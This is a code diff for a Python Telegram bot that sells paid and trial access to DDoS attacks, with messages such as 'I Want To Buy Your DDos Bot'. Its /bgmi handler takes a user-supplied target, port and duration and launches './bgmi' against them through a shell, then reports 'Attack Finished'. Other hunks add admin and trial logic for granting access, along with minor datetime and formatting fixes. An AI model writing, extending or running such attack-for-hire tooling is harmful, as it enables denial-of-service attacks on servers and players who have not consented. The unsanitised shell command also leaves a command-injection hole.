@@ -13,7 +13,7 @@ import telebot
 from datetime import datetime, timedelta
 import json
 import os
-
+global_user_id = None
 #from keep_alive import keep_alive
 #keep_alive()
 # insert your Telegram bot token here
@@ -82,7 +82,7 @@ def clear_logs():
 
 # Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    log_entry = f"UserID: {user_id} | Time: {datetime.now()} | Command: {command}"
     if target:
         log_entry += f" | Target: {target}"
     if port:
@@ -102,7 +102,7 @@ user_approval_expiry = {}
 def get_remaining_approval_time(user_id):
     expiry_date = user_approval_expiry.get(user_id)
     if expiry_date:
-        remaining_time = expiry_date - datetime.datetime.now()
+        remaining_time = expiry_date - datetime.now()
         if remaining_time.days < 0:
             return "Expired"
         else:
@@ -112,15 +112,15 @@ def get_remaining_approval_time(user_id):
 
 # Function to add or update user approval expiry date
 def set_approval_expiry_date(user_id, duration, time_unit):
-    current_time = datetime.datetime.now()
+    current_time = datetime.now()
     if time_unit == "hour" or time_unit == "hours":
-        expiry_date = current_time + datetime.timedelta(hours=duration)
+        expiry_date = current_time + timedelta(hours=duration)
     elif time_unit == "day" or time_unit == "days":
-        expiry_date = current_time + datetime.timedelta(days=duration)
+        expiry_date = current_time + timedelta(days=duration)
     elif time_unit == "week" or time_unit == "weeks":
-        expiry_date = current_time + datetime.timedelta(weeks=duration)
+        expiry_date = current_time + timedelta(weeks=duration)
     elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+        expiry_date = current_time + timedelta(days=30 * duration)  # Approximation of a month
     else:
         return False
     
@@ -293,48 +293,10 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
-bgmi_cooldown = {}
 
-COOLDOWN_TIME = 30
-
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙊𝙣 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 ❌. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 3⃣0⃣ 𝙨𝙚𝙘 𝘽𝙚𝙛𝙤𝙧𝙚 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙏𝙝𝙚 /bgmi 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘼𝙜𝙖𝙞𝙣."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
-            if time > 2000:
-                response = "Error: Time interval must be less than 1200."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
-                process = subprocess.run(full_command, shell=True)
-                response = f"🏁𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙.🏁 Target: {target} Port: {port} Time: {time} seconds"
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
-        else:
-            response = "✅ 𝙐𝙨𝙖𝙜𝙚 :- /𝙗𝙜𝙢𝙞 <target> <port> <time>"  # Updated command syntax
-    else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @Sanjay_Src | @Mr_InsaneX")
-
-    bot.reply_to(message, response)
-
-
+    
+    
+    
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
@@ -414,10 +376,15 @@ def append_user_id(user_id):
     with open(USER_TXT_FILE, "a") as file:
         file.write(f"{user_id}\n")
 
+
+
+    
+
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
     user_id = message.from_user.id
+    global_user_id = user_id
     username = "Sanjay_Src"
     message_text = f"Hello I Want To Buy Your DDos Bot & My User ID is: {user_id}"
     encoded_message = urllib.parse.quote(message_text)
@@ -442,12 +409,18 @@ Your user ID: {user_id}
     
     bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=keyboard)
 
+from datetime import datetime, timedelta
+import telebot
+import urllib.parse
+
+# Assuming load_user_data() and other necessary functions are defined elsewhere
+
 @bot.message_handler(commands=['trial'])
 def send_current_time(message):
-    user_id = str(message.from_user.id)
+    user_id = str(message.from_user.id)  # Ensure user_id is a string for consistency
     current_time = datetime.now()
     user_data = load_user_data()
-    
+
     username = "Sanjay_Src"
     message_text = f"Hello I Want To Buy Your DDos Bot & My User ID is: {user_id}"
     encoded_message = urllib.parse.quote(message_text)
@@ -461,12 +434,12 @@ def send_current_time(message):
         last_claimed_time = datetime.strptime(user_data[user_id], "%Y-%m-%d %H:%M:%S")
         if current_time - last_claimed_time < timedelta(days=1):
             # Trial already claimed
-            response = f'''🚫 **Trial Already Claimed** 🚫
+            response = '''<b>🚫 Trial Already Claimed 🚫</b>
     
 You have already claimed the trial in the last 24 hours. 😔
     
 But don't worry! You can still buy the bot using the link below:'''
-            bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=telebot.types.InlineKeyboardMarkup().add(button_buy))
+            bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=telebot.types.InlineKeyboardMarkup().add(button_buy))
             return
 
     # Add both buttons if trial is not claimed yet
@@ -474,7 +447,7 @@ But don't worry! You can still buy the bot using the link below:'''
     keyboard.add(button_trial)
     keyboard.add(button_buy)
 
-    response = f'''🎁 **Trial Available!** 🎁
+    response = f'''<b>🎁 Trial Available! 🎁</b>
     
 Exciting news! You can activate your trial for using our bot and enjoy all the features for the next 24 hours. 🚀
 
@@ -482,47 +455,163 @@ Your user ID: {user_id}
     
 👇🏼 Click the button below to get your free trial or purchase the bot:'''
     
-    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=keyboard)
+    bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=keyboard)
+    
 
+
+    
+@bot.message_handler(commands=['add'])
+def add_user(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        command = message.text.split()
+        if len(command) > 2:
+            user_to_add = command[1]
+            duration_str = command[2]
+
+            try:
+                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                if duration <= 0:
+                    raise ValueError
+                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
+                    raise ValueError
+            except ValueError:
+                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
+                bot.reply_to(message, response)
+                return
+
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                if set_approval_expiry_date(user_to_add, duration, time_unit):
+                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
+                else:
+                    response = "Failed to set approval expiry date. Please try again later."
+            else:
+                response = "User already exists 🤦‍♂️."
+        else:
+            response = "Please specify a user ID and the duration (e.g., 1 hour, 2 days, 3 weeks, 4 months) to add."
+    else:
+        response = "You have not purchased yet. Purchase now from @SrcEsp."
+
+    bot.reply_to(message, response)
+    
 @bot.callback_query_handler(func=lambda call: call.data == 'activate_trial')
 def handle_trial_activation(call):
     user_id = str(call.from_user.id)
     current_time = datetime.now()
-
-    # Append user ID to the user.txt file
-    append_user_id(user_id)
-
-    # Save the current time as the last claimed time
     user_data = load_user_data()
-    user_data[user_id] = current_time.strftime("%Y-%m-%d %H:%M:%S")
-    save_user_data(user_data)
 
-    # Update the message to hide the trial button and show only the buy button
-    username = "Sanjay_Src"
-    message_text = f"Hello I Want To Buy Your DDos Bot & My User ID is: {user_id}"
-    encoded_message = urllib.parse.quote(message_text)
-    url = f"https://t.me/{username}?text={encoded_message}"
+    # Set the trial expiry time (1 day from now)
+    expiry_time = current_time + timedelta(days=1)
+    user_data[user_id] = expiry_time.strftime("%Y-%m-%d %H:%M:%S")
 
-    # Create updated inline keyboard
-    keyboard = telebot.types.InlineKeyboardMarkup()
-    button_buy = telebot.types.InlineKeyboardButton(text="🛒 Buy Now", url=url)
-    keyboard.add(button_buy)
-
-    response = f'''🎉 **Trial Activated!** 🎉
+    # Check if the user is already in the allowed list
+    if user_id in allowed_user_ids:
+        last_claimed_time = user_approval_expiry.get(user_id, datetime.min)
+        if current_time - last_claimed_time < timedelta(days=1):
+            # Trial already claimed
+            response = '''<b>🚫 Trial Already Claimed 🚫</b>
     
-Congratulations! Your trial has been successfully activated. You can now enjoy our bot services for the next 24 hours. 🚀
-
-Your user ID: {user_id}
+You have already claimed the trial in the last 24 hours. 😔
+    
+But don't worry! You can still buy the bot using the link below:'''
+        else:
+            # User is in the list but trial period expired, re-add user
+            duration = 1
+            time_unit = 'days'
+            if set_approval_expiry_date(user_id, duration, time_unit):
+                response = f'''🎉 **Trial Activated!** 🎉
+    
+Congratulations! Your trial has been successfully re-activated. You can now enjoy our bot services for the next 24 hours. 🚀
     
 For more options, click the button below:'''
-    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, parse_mode='Markdown', reply_markup=keyboard)
+                # Save user data after successful activation
+                save_user_data(user_data)
+            else:
+                response = "Failed to set approval expiry date. Please try again later."
+    else:
+        # Add user for trial
+        allowed_user_ids.append(user_id)
+        with open(USER_FILE, "a") as file:
+            file.write(f"{user_id}\n")
+        duration = 1
+        time_unit = 'days'
+        if set_approval_expiry_date(user_id, duration, time_unit):
+            response = f'''🎉 **Trial Activated!** 🎉
+    
+Congratulations! Your trial has been successfully activated. You can now enjoy our bot services for the next 24 hours. 🚀
+    
+For more options, click the button below:
 
-# Start polling
+Click /help to View Commands'''
+            # Save user data after successful activation
+            save_user_data(user_data)
+        else:
+            response = "Failed to set approval expiry date. Please try again later."
+
+    # Create inline keyboard
+    keyboard = telebot.types.InlineKeyboardMarkup()
+    button_buy = telebot.types.InlineKeyboardButton(text="🛒 Buy Now", url="https://t.me/Sanjay_Src")
+    keyboard.add(button_buy)
+
+    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response, parse_mode='HTML', reply_markup=keyboard)
 
 
 
-# Start 
 
+
+
+
+
+
+
+
+
+
+bgmi_cooldown = {}
+
+COOLDOWN_TIME = 30
+
+# Handler for /bgmi command
+@bot.message_handler(commands=['bgmi'])
+def handle_bgmi(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        # Check if the user is in admin_id (admins have no cooldown)
+        if user_id not in admin_id:
+            # Check if the user has run the command before and is still within the cooldown period
+            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "𝙔𝙤𝙪 𝘼𝙧𝙚 𝙊𝙣 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 ❌. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 3⃣0⃣ 𝙨𝙚𝙘 𝘽𝙚𝙛𝙤𝙧𝙚 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙏𝙝𝙚 /bgmi 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝘼𝙜𝙖𝙞𝙣."
+                bot.reply_to(message, response)
+                return
+            # Update the last time the user ran the command
+            bgmi_cooldown[user_id] = datetime.now()
+        
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert port to integer
+            time = int(command[3])  # Convert time to integer
+            if time > 2000:
+                response = "Error: Time interval must be less than 1200."
+            else:
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./bgmi {target} {port} {time} 200"
+                process = subprocess.run(full_command, shell=True)
+                response = f"🏁𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙.🏁 Target: {target} Port: {port} Time: {time} seconds"
+                bot.reply_to(message, response)  # Notify the user that the attack is finished
+        else:
+            response = "✅ 𝙐𝙨𝙖𝙜𝙚 :- /𝙗𝙜𝙢𝙞 <target> <port> <time>"  # Updated command syntax
+    else:
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @DONATE_OWNER_BOT")
+
+    bot.reply_to(message, response)
+    
 
 @bot.message_handler(commands=['rules'])
 def welcome_rules(message):
